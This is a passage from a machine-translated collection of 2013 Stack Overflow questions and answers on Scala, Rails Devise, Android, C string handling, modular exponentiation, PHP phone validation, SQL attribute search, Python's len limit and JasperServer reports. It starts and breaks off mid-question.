在 Python 3.3 中运行以下简介时，我得到“解析时出现意外的 EOF”

```
x = 'a'
while (x == 'a') or (x == 'b'): 
```

在 Python 2.7 中运行它时，我得到“预期有缩进块”。

# scala - 在 Scala 中重构为高阶函数

> ID：15650826
> 
> 赞同：0
> 
> 时间：2013-03-27T02:12:24.100
> 
> 标签：scala

我是 Scala 的新手，想知道是否可以使用 Scala 对函数文字、高阶函数等的支持来重构这段代码

因为比赛和团队之间没有关系，我不明白这怎么可能。我想我可以为 Competition and Team 添加一个包含 name 属性的特征，这样就可以了。

还有其他选择吗？

```
class CompetitionDao extends BaseDao[Competition]{

  def retrieveAllCompetitionNames(): java.util.List[String] = {
    val competitions: java.util.List[_ <: Competition] = getDao().queryForAll()
    val competitionNames: java.util.List[String] = new ArrayList();
    for (competition <- competitions) competitionNames.add(competition.name)
    competitionNames
  } 

}

class TeamDao extends BaseDao[Team]{

  def retrieveAllTeamNames(): java.util.List[String] = {
    val teams: java.util.List[_ <: Team] = getDao().queryForAll()
    val teamNames: java.util.List[String] = new ArrayList();
    for (team <- teams) teamNames.add(team.name)
    teamNames
  }  
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T07:32:22.480

您可以像 Enrique 建议的那样引入`trait`和使用：`map`

```
import scala.collection.JavaConversions._

trait NameRetrieval[T <: { def name: String }] { self: BaseDao[T] =>
  def retrieveAllNames = getDao.queryForAll.map(_.name)
} 
```

然后你可以像这样使用它：

```
object TeamDao extends BaseDao[Team] with NameRetrieval[Team] 
```

## 编辑

这`[T <: { def name:String }]`意味着该`NameRetrieval`特征可用于具有称为 type 的元素的任何`name`类型`String`。要了解有关该符号的更多信息，请搜索“Scala 结构类型”。

`self: BaseDao[T]`我说这个特征只能与具有`BaseDao`相同类型的a 结合使用`T`。这使我可以自由地使用该`getDao`方法，因为我确定它是可用的。[Cake Pattern](https://stackoverflow.com/questions/5172188/understanding-scalas-cake-pattern)中使用了类似的模式，因此您可以查看它以获取更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T07:20:24.647

您可以尝试以下方法：

```
object DAO{
  def getNames: String => List[String] = { from =>
    from match {
      case "competition" => Competition.getDao().queryForAll().map(_.name)
      case "team" => Team.getDao().queryForAll().map(_.name)
    }
  }

  ...
} 
```

调用它就像

```
val temNames : List[String] = DAO.getNames("team") 
```

# ruby-on-rails - 在登录期间使用设计检查两个模型

> ID：15650829
> 
> 赞同：0
> 
> 时间：2013-03-27T02:12:42.710
> 
> 标签：ruby-on-rails, devise

我们在 Rails 应用程序中使用 Devise 进行身份验证。我们有两种模式 - 用户和专业人士。我们有许多专业人士不小心尝试以用户身份登录，如果用户登录失败，我们想检查输入的电子邮件是否与专业人士匹配。

例如，如果 Professional 尝试以用户身份登录，我们希望显示如下所示的 flash 消息：

“我们找不到此帐户的用户名/密码，但是，我们确实找到了专业帐户。单击此处以专业身份登录。”

关于如何用设计做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:44:56.287

我用忘记密码功能做了类似的事情。它可以帮助你。

**编辑**：添加专业检查。

```
def reset
  @idiot = User.where(:email => params[:email]).first
  unless @idiot.nil?
    Notifier.send_reset_notice(@idiot).deliver
    redirect_to new_user_session_url, notice: "A new password will be emailed to #{@idiot.name}'s address shortly."
  else 
    @professional = Professional.where(:email => params[:email]).first
    unless @professional.nil?
      redirect_to new_professional_session_url, notice: "That email address is assigned to a professional. Sign in below."
    else 
      redirect_to new_user_session_url, :flash => { :error => "That email address matches no user." }
    end
  end
end 
```

在视图中：

```
<%= form_tag reset_path(:email) do %>
  <%= email_field_tag :email, nil, :placeholder => 'Email address' %>
  <%= submit_tag "Reset password" %></div>
<% end %> 
```

应该让你走上正轨。

# ajax - ajaxCRUD.com 多重关系

> ID：15650831
> 
> 赞同：1
> 
> 时间：2013-03-27T02:12:51.887
> 
> 标签：ajax, foreign-keys, relational-database, crud, foreign-key-relationship

我真的不确定我会找人帮忙，但让我们试一试吧！

我正在使用来自 ajaxCRUD.com 的 CRUD 脚本，并且我想在我的表之间创建多个关系。但是，当我尝试这样做时，只会出现第一个关系。

我想将我`fruits`的表与`properties`表链接：

```
$tblDemo = new ajaxCRUD("Fruits", "my_fruits", "id", "../");
$tblDemo->defineRelationship("id", "properties", "id", "color");
$tblDemo->defineRelationship("id", "properties", "id", "taste"); 
```

如果我想从同一个“关系”表中获取颜色和味道，则只有其中一个会显示。

关于我如何在同一张表的两个（或更多）列之间建立关系的任何提示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-25T14:15:59.700

如果您在数据库中创建一个视图来连接颜色和味道会怎样，例如：

```
CREATE VIEW v_properties AS
SELECT id, CONCAT(color, ' - ', taste) AS color_taste
FROM properties; 
```

然后在您的代码中引用该视图：

```
$tblDemo->defineRelationship("id", "v_properties", "id", "color_taste"); 
```

那行得通吗？

或者，如果它适用于视图，则创建一个只是属性别名的视图：

```
CREATE VIEW properties2 AS
SELECT * FROM properties 
```

并在第二个链接中使用 properties2：

```
$tblDemo->defineRelationship("id", "properties", "id", "color");
$tblDemo->defineRelationship("id", "properties2", "id", "taste"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-21T14:29:42.230

在我的例子中

```
$tblFriend->defineRelationship("idCliente", "clientes", "idClientes","nombreCliente");
$tblFriend->defineRelationship("idCategoria", "categorias", "idCategoria","nombreCategoria"); 
```

我看到两人的关系很完美。没有额外的代码或任何东西

![在此处输入图像描述](../Images/f270e3675c5da363fbaed993035ddeb0.png)

# css - 防止在表格单元格中悬停时轻推相邻的 fontawesome/bootstrap 图标

> ID：15650832
> 
> 赞同：0
> 
> 时间：2013-03-27T02:12:55.540
> 
> 标签：css, twitter-bootstrap, icons, alignment, font-awesome

我做了一个小提琴来展示我的问题以及我正在尝试做的事情。

[http://jsfiddle.net/kvseelbach/rXEEZ/20/](http://jsfiddle.net/kvseelbach/rXEEZ/20/)

我尝试了以下 CSS：

```
td a[class^="icon-"]:before, td a[class*="icon-"]:before { padding-right:2px; } 
```

我将 FontAwesome 与引导程序一起使用，并希望在第一个链接悬停并放大时防止在每个单元格中轻推第二个图标（显示/编辑记录链接）。我在 :before item 等上尝试了边框透明、padding-right 等，但未能完善它。

我怎样才能让它与 CSS 一起顺利工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:31:58.327

最简单的：

```
.dr-fxwidth {
    width: 48px;
    white-space: nowrap; /* <<< */
} 
```

[http://jsfiddle.net/userdude/rXEEZ/21/](http://jsfiddle.net/userdude/rXEEZ/21/)

它仍然会调整表格的布局，但不会导致图标元素触发文本换行。

# android - 在 OnClickListener ListView 中设置变量时创建全局变量并出错

> ID：15650845
> 
> 赞同：1
> 
> 时间：2013-03-27T02:14:21.397
> 
> 标签：android

我浏览了很多帖子并尝试了它们，但似乎没有任何效果。我想这可能是我错过的东西。这是我正在尝试做的事情和我的问题：我正在尝试创建一个全局变量，以便在我的主活动上，当用户从 ListView 中选择一个项目时，我想将该项目分配给变量和在我的应用程序中使用它。

首先我创建了一个类并将其扩展到应用程序，如下所示：

导入android.app.Application；

公共类 GlobalVariables 扩展应用程序 {

```
private String mStringValue;

public String getSomeVariable() {
    return mStringValue;
}

public void setSomeVariable(String someVariable) {
    this.mStringValue = someVariable;
} 
```

}

然后在我的主要活动中，我把这段代码设置为变量：

```
public class MainActivity extends Activity {    

@Override 
public void onCreate(Bundle savedInstanceState) {   
    super.onCreate(savedInstanceState);   
    setContentView(R.layout.activity_main);     

 ListView.setOnItemClickListener(new OnItemClickListener() {    

 @Override   
 public void onItemClick(AdapterView<?> listView, View view,       
int position, long id) {    

// Get the cursor, positioned to the corresponding row in the result set    
Cursor cursor = (Cursor) listView.getItemAtPosition(position);      
// Get the Customer Name from this row in the database.    
String countryCode = cursor.getString(cursor.getColumnIndexOrThrow("CustomerName"));    

Toast.makeText(getApplicationContext(), countryCode, Toast.LENGTH_SHORT).show();      

((GlobalVariables) this.getApplication()).setSomeVariable(countryCode);

   }   

}); 
```

问题是我在这一行收到错误“方法 getApplication() 未定义类型 new AdapterView.OnItemClickListener(){}”：

```
((GlobalVariables) this.getApplication()).setSomeVariable(countryCode); 
```

我阅读了建议执行以下代码的帖子之一，但随后又出现了多个错误：

*   对于 GlobalVariables 类型，方法 getApplication() 未定义
*   范围内无法访问 GlobalVariables 类型的封闭实例

    ((GlobalVariables) GlobalVariables.this.getApplication()).setSomeVariable("foo");

您能给我的任何帮助将不胜感激。

谢谢，

蒂姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:21:47.917

你为什么不定义你的 GlobalVariables 如下：

```
public class GlobalVariables
{
    static String mStringValue;
} 
```

然后你可以在你的应用程序的任何地方使用它`GlobalVariables.mStringValue`，例如`GlobalVariables.mStringValue`= countryCode;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:18:16.223

`OnItemClickListener()`是一个匿名内部类。这意味着当你`this`在它里面时，`this`实际上是指一个类型的对象`OnItemClickListener`，它没有方法`getApplication()`。

尝试：

```
((GlobalVariables) MainActivity.this.getApplication()).setSomeVariable(countryCode); 
```

# java - java中有没有类似于array[1:]的东西？

> ID：15650846
> 
> 赞同：1
> 
> 时间：2013-03-27T02:14:21.533
> 
> 标签：java, arrays

使用字符串数组，我想递归调用一个方法，参数是从索引 1 到末尾的数组。在python中，它看起来像array[1:]，我一直在java中寻找类似的东西，但还没有，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:36:56.900

你搬到`List`：

```
Integer[] array = ...;
List<Integer> list = Arrays.asList(array);
list.subList(1, list.length()); 
```

如果您的数组必须是 'primitive' `int`，那么您可以使用[Trove 的 TIntArrayList](http://trove4j.sourceforge.net/javadocs/gnu/trove/list/array/TIntArrayList.html#wrap%28int%5B%5D%29)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:16:41.153

不可以。您必须传递起始索引和（可能）结束索引。这看起来像：

```
public static void doThing(int[] array, int start){
    //do something here to array[start]
    doThing(array, start+1);
} 
```

# c - strcpy 损坏 char 数组（字符串值）

> ID：15650849
> 
> 赞同：0
> 
> 时间：2013-03-27T02:15:09.820
> 
> 标签：c, memory-management, linked-list, realloc, strcpy

下面的函数尝试按升序对链表上的字符串进行排序。当它返回新列表时，它会损坏。

```
void* order( void *ptr){
    struct wordlist *head;
    head = (struct wordlist *) ptr;

    struct wordlist *first = (struct wordlist*)malloc(sizeof(struct wordlist));
    struct wordlist *second = (struct wordlist*)malloc(sizeof(struct wordlist));
    struct wordlist *temp = (struct wordlist*)malloc(sizeof(struct wordlist));

    first = head;

    int j = 1;
    while( first != NULL){
        second = first->next;

        while( second != NULL){
            if( strcmp( first->word, second->word) > 0){
                if( temp->word == NULL){
                    temp->word = malloc( sizeof(first->word));
                }
                else{
                    if( realloc( temp->word, sizeof( first->word)) != NULL){
                        strcpy( temp->word, first->word);
                    }
                }

                if( realloc( first->word, sizeof(second->word)) != NULL){
                    strcpy( first->word, second->word);
                }

                if( realloc( second->word, sizeof(temp->word)) != NULL){
                    strcpy( second->word, temp->word);
                }

                free(temp);
            }
            second = second->next;
        }
        j++;
        first = first->next;
    }
} 
```

例如，如果输入是

```
piero
ronaldo
messi 
```

然后输出看起来像

```
messi
ŽŽŽ
ronaldo 
```

上面的例子没有在代码上试过，但它会给你一个线索。我相信内存分配有问题，但我无法找到它。顺便说一句，有时这些话也是空的。

另外，词表如下：

```
struct wordlist{
    char *word;
    struct wordlist *next;
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:28:07.100

您不会第一次将字符串复制到临时文件中。

```
 if( temp->word == NULL){
                temp->word = malloc( sizeof(first->word));
                // You forgot to copy!!
            }
            else{
                if( realloc( temp->word, sizeof( first->word)) != NULL){
                    strcpy( temp->word, first->word);
                }
            } 
```

看， if `temp->word`is `NULL`，它*应该是*第一次（请注意，您实际上并没有清除`temp`结构，所以您已经得到未定义的行为），那么您不要复制它。快速修复是`strcpy`在你之后做一个`malloc`。

你的`realloc`电话都是错的。您不能用于`sizeof`获取字符串的大小。使用`strlen`它，并且不要忘记为字符串终止符添加一个额外的字节。

此外，您不应分配`first`and `second`。它们是您的数据结构的迭代器。您要做的第一件事是丢弃它们的值，以便泄漏内存。不要忘记`free`你的`temp`结构以及`temp->word`之后。

在你开始工作后，请停止这一切`malloc`和`strcpy`生意！！！

要移动字符串，您只需要移动指针。无需重新分配或复制。这会将您的代码简化为几行。

哦，您是否也忘记`return`了函数中的值？

# java - 为什么这个函数对计算模块化 pow 值有效？

> ID：15650850
> 
> 赞同：2
> 
> 时间：2013-03-27T02:15:38.913
> 
> 标签：java, algorithm

我在[SRM 573 的解决方案中看到了这个功能：](http://apps.topcoder.com/wiki/display/tc/SRM+573#WolfPack)

```
long modPow(long x, long y)
{
    //Caculates x raised to the y-power modulo MOD
    //in O(log(y)) time by using  repeated squaring
    long r = 1;
    while(y > 0){
        if( (y&1) != 0) {
            r = (r * x) % MOD;
        }
        x = (x * x)%MOD;
        y >>= 1;
    }
    return r;
} 
```

但是我对这个函数感到困惑，无法**计算 ; 的模值`x^y%MOD`**。
为什么`x = (x * x)%MOD;`需要在函数中？
这对我来说没有意义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:32:17.597

tl; dr：这是一种优化。

假设 x 为 2，MOD 为 3。请注意，x 的唯一用途是将 r 乘以 x。

现在想象我们平方 x。x*x = 4。现在，r*4 % 3 将等于 1, 2, 3, 4, 5... 因为 r = 1, 2, 3, 4, 5... 哦！这与 x 为 1 相同。事实上，如果将 x 设置为 x*x %3 而不仅仅是 x*x，您将得到相同的结果。

但是下一步呢？4*4 = 16, %3 = 1\. 1*1 = 1, %3 also = 1\. 因此，无论我们是否提前或延迟或从不修改操作，我们都会陷入相同的残差。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T03:34:53.037

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T04:22:12.007

暂时忘掉模部分，问问自己，“我怎样才能有效地计算 na 正整数的 x^n？” 您可以通过一次乘法计算 x^2：x * x。您可以通过两次乘法计算 x^3：x^3 = x * x^2。您可以通过两次乘法计算 x^4：x^4 = x^2^2 = x^2 * x^2。你可以用这个递归来计算 x^n：

```
For even n = 2*m, x^n = (x^2)^m.

For odd n = 2*m + 1, x^n = x * (x^m)^2. 
```

所以，我们得到 x^10 为：

```
x^10 = (x^2)^5
     = x^2 * (x^4)*2 
```

计算 x^2、x^4、x^8、x^10，进行 4 次乘法运算。

请注意，这是一个很好的通用方法，但不能保证它是最有效的。例如，试试 x^15。这个方法给你 x * (x^2)^7 = x * x^2 * (x^2)^6 = x * x^2 ^ (x^4)^3 = x ^ x^2 * x^ 4 * (x^4)^2。您计算 x^2、x^4、x^8，然后是 x * x^2 * x^4 * x^8，进行 6 次乘法运算。更快的是

```
y = x^3 = x * x^2, 2 multiplications.
x^15 = y^5 = y * (y^2)^2, 3 more multiplications,
This is a total of 5 multiplications. 
```

实际上，对于指数 n，将加法链定义为从 1 开始到 n 结束的数字序列，其中列表中的每个数字是序列中前两个数字的总和（您可以重复）。

15 的算法给出

1、2、3、6、7、14、15。

较短的是

1、2、3、6、12、15。

事实证明，要找到以目标数字结尾的最短加法链在计算上是很困难的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T03:44:41.950

详细说明@jwpat7 的答案，让我们想想为什么

`(x % MOD)*(x % MOD) ≡ (x*x) % MOD`.

我们总是可以写`x`为`x = n*MOD + r`一些自然`n`和`r`with `r < MOD`（如果这也`x < MOD`暗示`x = r`and `n = 0`）。

现在，我们总是得到`x % MOD = (n*MOD + r) % MOD = r`，因此我们得到

`(x % MOD)*(x % MOD) = r * r`.

另一方面，考虑`(x*x) % MOD`评估结果：

`x*x = (n*MOD + r)*(n*MOD +r) = n*n*MOD*MOD + 2*n*r*MOD + r*r`，因此我们得到`(x*x) % MOD = (n*n*MOD*MOD + 2*n*r*MOD + r*r) % MOD = r*r`

这就是为什么 Patashu 说无论你早晚应用模运算符都没有关系，因为余数`r`实际上是与模运算相关的所有内容，也是唯一延续到下一次迭代的东西。

# php - 使用 ZF2 和 TWIG 在 Module.php 中初始化布局变量

> ID：15650851
> 
> 赞同：1
> 
> 时间：2013-03-27T02:15:48.713
> 
> 标签：php, zend-framework2, twig

再会，

我有一个 Twig 布局模板，其中包含 ZF2 骨架（zfctwig 版本）的内容，我想使用我将在 module.config.php 中设置的变量进行动态主导航。

布局.twig：

```
<div class="nav-collapse collapse">
   <ul class="nav">
   {% for item in navigation %}

    <li {% if item.active %} class="active" {% endif %}>
       <a href="{{ url(item.route) }}">
       {{ translate(item.name) }}
       </a>
    </li>

   {% endfor %}
   </ul>
</div><!--/.nav-collapse --> 
```

我将使用 Module.php 中的 onBootstrap() 方法传递它：

模块.php：

```
$navigation = array(
   'home' => array(
      'name' => 'Home',
      'route' => 'home',
   ),
   'profile' => array(
      'name' => 'Profile',
      'route' => 'myroute',
      'active' => true
   ),
);

$view = $e->getApplication('application')->getMvcEvent()->getViewModel();

$view->navigation = $navigation; 
```

$navigation 变量将在我完成此工作后放置在我的 module.config.php 中。

当我不在模板中使用树枝时（例如没有树枝代码的 layout.phtml），此代码有效，但当我使用上面的 layout.twig 时，{{navigation}} 为空。

我认为我不应该使用

```
$view = $e->getApplication('application')->getMvcEvent()->getViewModel(); 
```

因为我认为它返回默认的 zf2 ViewModel 而不是 twig 版本，但我不知道它是如何检索的。

如果这不是问题，我做错了什么？如果我让它工作，我如何在我的一个控制器中将 $navigation['profile'] 的活动索引更改为 false？

非常感谢！

**更新：**

似乎没有人遇到过同样的问题。我这样做是错误的吗？有一个更好的方法吗？目标是创建一个动态主菜单和导航，可以使用 module.config.php 中的设置进行修改，而不是不断更新视图文件。在特定控制器中更改它也不好，因为我希望它是全局的，因为主菜单在每个页面上都是相同的。我在网上搜索，但找不到使用 twig 的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T06:15:27.227

```
$sm->get('ZfcTwigRenderer'); 
```

使用此代码访问树枝渲染器

例子 ：

```
public function onBootstrap(MvcEvent $e)
    {

        $ZfcTwigRenderer = $e->getApplication()->getServiceManager()->get('ZfcTwigRenderer');

    } 
```

# c - 在 C 中动态分配结构是如何工作的？

> ID：15650858
> 
> 赞同：1
> 
> 时间：2013-03-27T02:16:57.243
> 
> 标签：c, pointers, memory, struct, malloc

我最近有一个任务，我必须为结构动态分配内存。我使用了这种方法：

```
myStruct *struct1 = malloc(sizeof *struct1); 
```

这工作得很好。但是，我不明白怎么做。我认为`struct1`指针此时未初始化，因此应该没有大小。那么如何`malloc(sizeof *struct1)`返回有效的内存量来分配呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T02:23:08.857

`sizeof`C 中的运算符不计算操作数。它只看类型。例如：

```
#include <stdio.h>

int main(void)
{
    int i = 0;
    printf("%zu\n", sizeof i++);
    printf("%d\n", i);
    return 0;
} 
```

如果你运行上面的程序，你会看到它`i`仍然是 0。

因此，在您的示例中，`*struct1`未评估，它仅用于类型信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:25:05.890

```
malloc(sizeof(*struct1)) 
```

分配的内存量等于结构的大小，具体取决于您声明的结构变量的数量。Sizeof 用于返回 struct1 的大小，该大小是在编译时发现的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-29T09:08:39.463

试试这个。先声明结构，

```
typedef struct {

int a;
int b;
int c;

}MyStruct; 
```

然后在分配内存之前，初始化一个结构变量并按照给定的分配内存，

```
MyStruct test;

printf("~~~~~ sizeofStruct: %ld", sizeof(test));

MyStruct *myAlloc = (MyStruct *)malloc(sizeof(test));

printf("~~~~~ sizeofmyAlloc: %ld", sizeof(*myAlloc)); 
```

干杯！

# php - 如何更新此 PHP 正则表达式以不允许电话号码中的数字超过 10 位？

> ID：15650859
> 
> 赞同：1
> 
> 时间：2013-03-27T02:17:11.047
> 
> 标签：php, regex, forms, validation, preg-match

我正在使用以下正则表达式来确保输入有效的电话号码。如果输入超过 10 个数字，它目前不会标记错误。

如何解决这个问题？

```
public function phoneNumber($value) {
    if (preg_match("/^\(?[0-9]{3}\)? *-? *[0-9]{3} *-? *[0-9]{4}$/", $value)) {
        return true;
    }

    return false;
} 
```

这是一个当前不应该显示为有效电话号码的测试用例：

> 35353535355535555555

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T02:24:41.560

如果您只对数字感兴趣，则可以过滤掉其他所有内容并检查结果：

```
public function phoneNumber($value) {
    $filtered = preg_replace("/\D/","",$value);
    return strlen($filtered) == 10;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T03:16:59.990

过滤掉外国号码或带有扩展名的号码不是一个好主意。这是我用于将常用数字转换为 CRM 注入的特定格式的示例。包括垃圾邮件评分。

```
<?php
    function phoneNumber($value) {
        $phoneScore = 0;
        $numbers = preg_replace('![^0-9]!','',$value);
        //if it's too small to be a US number, then ramp it up.
        if (!empty($value)&&(strlen($numbers) < 10)){
            $phoneScore = $phoneScore + 3;
        } elseif (empty($value)){
            $phoneScore = $phoneScore + 10;     
        }
        return $phoneScore;
    }

    $numbers = array(
    '(911 -535 -3535',
    '800.555.1212',
    '800  458 2180',
    '800 - 458 2180',
    '800 - 458-2180',
    '',
    '800-555-1212 ext# 212',
    '+49 (0)69 974640',
    '+86 (021) 5466-2808',
    '+66 (02) 261-3525',
    '+44 (020) 7626-0224',
    '123456',
    );

    $patterns = array('![^0-9xX#+]!','!-+!','!-?[xX#]-?!','!#+!','!#!','!^-!');
    $replacements = array("-","-",'#','#',' #','');

    foreach ($numbers as $value){
        $score = phoneNumber($value);
        $clean_num = preg_replace($patterns,$replacements,$value);
        echo "$value = Score $score.<br />\n Cleaned Number = $clean_num<br />\n<br />\n";
    }

?> 
```

输出如下所示：

> （911 -535 -3535 = 0 分。清洁次数 = 911-535-3535
> 
> 800.555.1212 = 0 分。清除次数 = 800-555-1212
> 
> 800 458 2180 = 0 分。清洁次数 = 800-458-2180
> 
> 800 - 458 2180 = 0 分。清洁次数 = 800-458-2180
> 
> 800 - 458-2180 = 0 分。清洁次数 = 800-458-2180
> 
> = 得分 10。清洁次数 =
> 
> 800-555-1212 分机# 212 = 得分 0。已清理号码 = 800-555-1212 #212
> 
> +49 (0)69 974640 = 0 分。清洁次数 = +49-0-69-974640
> 
> +86 (021) 5466-2808 = 0 分。清洁号码 = +86-021-5466-2808
> 
> +66 (02) 261-3525 = 0 分。清洁次数 = +66-02-261-3525
> 
> +44 (020) 7626-0224 = 0 分。清洁号码 = +44-020-7626-0224
> 
> 123456 = 3 分。清洁次数 = 123456

# ruby-on-rails-3 - ActiveMerchant with Authorize.net CIM - 如何更新客户付款资料

> ID：15650873
> 
> 赞同：0
> 
> 时间：2013-03-27T02:19:13.917
> 
> 标签：ruby-on-rails-3, authorize.net, activemerchant

我目前正在使用 ActiveMerchant 与 Authorize.net CIM 集成。它工作正常。但是，我在更新客户的付款资料信息时遇到问题（类似于此 -[如何在 Authorize.NET (CIM) 中更新客户付款资料详细信息？](https://stackoverflow.com/questions/8243497/how-can-i-update-customer-payment-profile-details-in-authorize-net-cim)）

基本上，当 ActiveMerchant 想要向 Authorize.net 发送 API 请求时，它需要我为信用卡支付详细信息构建一个 CreditCard 模型，而不仅仅是提供一个哈希值。但是对于更新客户的付款资料，我没有该卡的实际值，只有卡号的“XXXX1111”或到期日期的“XXXX”之类的屏蔽字符串。

我无法使用这些值创建验证 CreditCard 模型，但我需要做的就是将屏蔽值传递回 Authorize.net。不过，我找不到任何有关如何执行此操作的文档。有没有其他人遇到过这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T10:43:34.763

您需要仅使用被屏蔽的卡号创建一个无效的 CreditCard 对象。CreditCard 对象将检测到不存在年份或月份，并使用“XXXX”作为完整的到期日期。CreditCard 对象本身将是无效的，但它会创建一个有效的更新请求。

这是我可以弄清楚如何解决问题的唯一方法，因为 update_customer_payment_profile 方法希望能够在对象上调用“数字”方法，因此它需要信用卡或其他带有“数字”的对象。

# mysql - 跨多个表搜索

> ID：15650876
> 
> 赞同：0
> 
> 时间：2013-03-27T02:19:23.577
> 
> 标签：mysql, database, database-design, relational-division

我的应用程序有一些***Pages***拥有一些***Attributes***。***页面***可以***链接***在一起。我希望我的数据库结构能够最好地支持搜索包含属于***Pages的某些******Attributes的******Links***。链接是页面的集合，页面可以有许多链接。

 *** * *

我的数据库结构目前如下

```
PAGE:
    id
    title
    content 
```

-

```
ATTRIBUTE:
    id
    page_id
    name
    value 
```

-

```
LINK:
    id
    title 
```

-

```
PAGE_LINK:
    page_id
    link_id 
```

* * *

假设我有一个名为*“Mash Potato”的食谱****页面***和一个名为*“Potato”*的配料***页面***，它们包含在一个名为*“Potato Link”的链接****中***。*“土豆泥”*具有以下***属性***-*膳食：晚餐，风味：咸味，难度：简单，*并且*“土豆”*具有以下***属性***-*季节：秋季，价格：便宜*。

 ***我希望能够找到一个*便宜、美味和秋季季节*的链接，并获得“*土豆链接”*作为回报。

* * *

如何在 SQL 中编写该查询，这是查询此类内容的最佳数据库结构吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-28T14:29:50.770

您的属性附加到页面。因此，您可以通过检查页面是否存在这些属性来搜索具有某些属性的页面。查找页面如下所示：

```
Select Page.ID
From Page
where EXISTS
 (Select * 
  From Attributes
  Where Page_Id = Page.ID
    and (     (Name = 'Season' and Value = 'Autumn')
          or  (Name = 'Flavour' and Value = 'Savory')
          ... etc. ...
        ) 
```

如果您想查找链接，则可以将其加入 PAGE_LINK（如果您愿意，甚至可以加入 LINK）。

```
Select Page.ID
From Page
 Join Page_Link PL on PL.Page_ID = Page.ID
 Join Link on Link.ID = PL.Link_ID
where EXISTS
 (Select * 
  From Attributes
  Where Page_Id = Page.ID
    and (     (Name = 'Season' and Value = 'Autumn')
          or  (Name = 'Flavour' and Value = 'Savory')
          ... etc. ...
        ) 
```*****

# python - >64 位时从 __len__() 返回

> ID：15650878
> 
> 赞同：13
> 
> 时间：2013-03-27T02:20:01.657
> 
> 标签：python, ipv6, long-integer

在这个问题中，我处理的是 IPv6 网络地址空间，所以长度是`2^(128-subnet)`.

看来python（至少在这台机器上）将处理多达 64 位有符号数作为来自`__len__()`. 所以`len(IP('2001::/66'))`有效，但`len(IP('2001::/65'))`失败了。

```
from IPy import IP
len(IP('2001::/64'))
Traceback (most recent call last):
  File "test.py", line 2, in <module>
      len(IP('2001::/64'))
OverflowError: long int too large to convert to int 
```

有问题的 IPy 库位于[https://github.com/haypo/python-ipy](https://github.com/haypo/python-ipy)。

关于如何处理这个问题的任何建议，或者暗示这可能是我坚持的限制？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-27T03:12:48.640

您遇到的问题是 Python 的 C API 对容器的长度有系统相关的限制。也就是说，C 函数`PyObject_Size`返回一个`Py_ssize_t`值，它是标准 C`size_t`类型的有符号版本。它的大小取决于系统，但在 32 位系统上可能是 32 位，在 64 位系统上可能是 64 位。

内置`len`函数使用`PyObject_Size`，因此具有相同的限制。这是[它当前的实现](http://hg.python.org/cpython/file/e87364449954/Python/bltinmodule.c#l1312)：

```
static PyObject *
builtin_len(PyObject *self, PyObject *v)
{
    Py_ssize_t res;

    res = PyObject_Size(v);
    if (res < 0 && PyErr_Occurred())
        return NULL;
    return PyInt_FromSsize_t(res);
} 
```

`len`您可以通过使用对象上的方法来解决此限制`IP`，而不是调用内置函数`len`：

```
IP('2001::/64').len() 
```

这是纯python，所以它对整数大小没有任何限制。

# java - 我如何从 jasperserver 获取报告？

> ID：15650880
> 
> 赞同：1
> 
> 时间：2013-03-27T02:20:03.907
> 
> 标签：java, jasper-reports, jasperserver

请帮我解决它，我真的不知道！请

/* - 要更改此模板，请选择工具 | 模板 - 并在编辑器中打开模板。*/ - 打包pdfprint；

```
import com.jaspersoft.ireport.jasperserver.JServer; import
com.jaspersoft.ireport.jasperserver.ws.WSClient; import
java.util.HashMap; import java.util.*; import
net.sf.jasperreports.engine.JasperPrint; import
net.sf.jasperreports.engine.JasperReport; import
net.sf.jasperreports.engine.export.JRPrintServiceExporter; import
net.sf.jasperreports.engine.export.JRPrintServiceExporterParameter;
import net.sf.jasperreports.view.JasperViewer;

public class Pdfprint {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
      try{
    JServer server = new JServer();
    server.setUrl("http://localhost:8080/jasperserver/services/repository");
    server.setUsername("jasperadmin");
    server.setPassword("jasperadmin");

    ResourceDescriptor rd = new ResourceDescriptor();
    rd.setUriString("/solucisv3_testing/jr_testing_print");

    WSClient client = new WSClient(server);
    List list = client.list(rd);

      Map params = new HashMap();
      params.put("Plb_Company", "Company");
      params.put("Plb_Address", "Address");
      params.put("Plb_Title","Title");
      params.put("PCondition","SELECT * FROM v_doc_ticketing  WHERE f_doc_no='MYCSB0000096'");

     JasperPrint printer = client.runReport(rd, params);
     JasperViewer.viewReport(printer, false,Locale.GERMAN);

     JRPrintServiceExporter exporter;
     exporter = new JRPrintServiceExporter();
     //exporter.setParameter(JRExporterParameter.JASPER_PRINT, jp);
     exporter.setParameter(JRPrintServiceExporterParameter.DISPLAY_PAGE_DIALOG,
Boolean.FALSE);
     exporter.setParameter(JRPrintServiceExporterParameter.DISPLAY_PRINT_DIALOG,
Boolean.TRUE);
     exporter.setParameter(JRPdfExporterParameter.PDF_JAVASCRIPT,"this.print({bUI:
false,bSilent: true,bShrinkToFit: true});");
